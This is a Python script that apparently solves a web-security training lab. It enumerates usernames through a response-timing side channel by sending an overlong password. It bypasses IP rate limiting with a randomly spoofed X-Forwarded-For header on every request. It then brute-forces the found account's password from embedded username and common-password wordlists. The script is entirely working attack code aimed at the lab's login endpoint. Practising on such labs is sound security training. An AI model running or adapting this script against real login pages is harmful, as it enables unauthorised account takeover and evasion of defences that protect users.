import requests
import random
import time
url = "https://0a4700bd04c2e925811a0276001700cc.web-security-academy.net/login"
def genIp():
    ip = str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255)) + "." + str(random.randint(0, 255))
    return ip
def bruteforce():
    username = """carlos
        root
        admin
        test
        guest
        info
        adm
        mysql
        user
        administrator
        oracle
        ftp
        pi
        puppet
        ansible
        ec2-user
        vagrant
        azureuser
        academico
        acceso
        access
        accounting
        accounts
        acid
        activestat
        ad
        adam
        adkit
        admin
        administracion
        administrador
        administrator
        administrators
        admins
        ads
        adserver
        adsl
        ae
        af
        affiliate
        affiliates
        afiliados
        ag
        agenda
        agent
        ai
        aix
        ajax
        ak
        akamai
        al
        alabama
        alaska
        albuquerque
        alerts
        alpha
        alterwind
        am
        amarillo
        americas
        an
        anaheim
        analyzer
        announce
        announcements
        antivirus
        ao
        ap
        apache
        apollo
        app
        app01
        app1
        apple
        application
        applications
        apps
        appserver
        aq
        ar
        archie
        arcsight
        argentina
        arizona
        arkansas
        arlington
        as
        as400
        asia
        asterix
        at
        athena
        atlanta
        atlas
        att
        au
        auction
        austin
        auth
        auto
        autodiscover""".split()
    password = """123456
        password
        12345678
        qwerty
        123456789
        12345
        1234
        111111
        1234567
        dragon
        123123
        baseball
        abc123
        football
        monkey
        letmein
        shadow
        master
        666666
        qwertyuiop
        123321
        mustang
        1234567890
        michael
        654321
        superman
        1qaz2wsx
        7777777
        121212
        000000
        qazwsx
        123qwe
        killer
        trustno1
        jordan
        jennifer
        zxcvbnm
        asdfgh
        hunter
        buster
        soccer
        harley
        batman
        andrew
        tigger
        sunshine
        iloveyou
        2000
        charlie
        robert
        thomas
        hockey
        ranger
        daniel
        starwars
        klaster
        112233
        george
        computer
        michelle
        jessica
        pepper
        1111
        zxcvbn
        555555
        11111111
        131313
        freedom
        777777
        pass
        maggie
        159753
        aaaaaa
        ginger
        princess
        joshua
        cheese
        amanda
        summer
        love
        ashley
        nicole
        chelsea
        biteme
        matthew
        access
        yankees
        987654321
        dallas
        austin
        thunder
        taylor
        matrix
        mobilemail
        mom
        monitor
        monitoring
        montana
        moon
        moscow""".split()
    
    for item in username:
        headers = {
            "X-Forwarded-For" : genIp()
        }   
        payload = {
            "username" : item,
            "password" : "daruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebertdaruliebert"
        }
        response = requests.post(url=url, headers=headers, data=payload)
        if response.elapsed.total_seconds() > 5:
            print("username: " + item)
            print("now try bruteforce password!!!")
            for pswd in password:
                payload_new = {
                    "username" : item,
                    "password" : pswd
                }
                headers = {
                    "X-Forwarded-For" : genIp()
                }
                response = requests.post(url=url, headers=headers, data=payload_new)
                if (response.status_code == 302 or "Congratulations, you solved the lab!" in response.text):
                    print("password: " + pswd)
                else:
                    print("testing: " + pswd)
        else:
            print(headers["X-Forwarded-For"])
            print("testing " + item + " cost " + str(response.elapsed.total_seconds()))
        

bruteforce()
